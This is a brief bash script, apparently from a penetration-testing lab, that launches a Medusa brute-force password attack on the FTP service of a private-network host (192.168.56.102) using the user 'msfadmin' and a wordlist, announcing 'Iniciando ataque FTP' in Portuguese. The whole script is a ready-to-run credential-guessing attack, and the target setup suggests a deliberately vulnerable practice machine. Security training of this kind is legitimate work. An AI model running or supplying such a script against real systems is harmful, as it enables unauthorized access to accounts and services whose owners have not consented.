#!/bin/bash

TARGET="192.168.56.102"
USER="msfadmin"
WORDLIST="../wordlists/wordlist.txt"

echo "[+] Iniciando ataque FTP..."
medusa -h $TARGET -u $USER -P $WORDLIST -M ftp

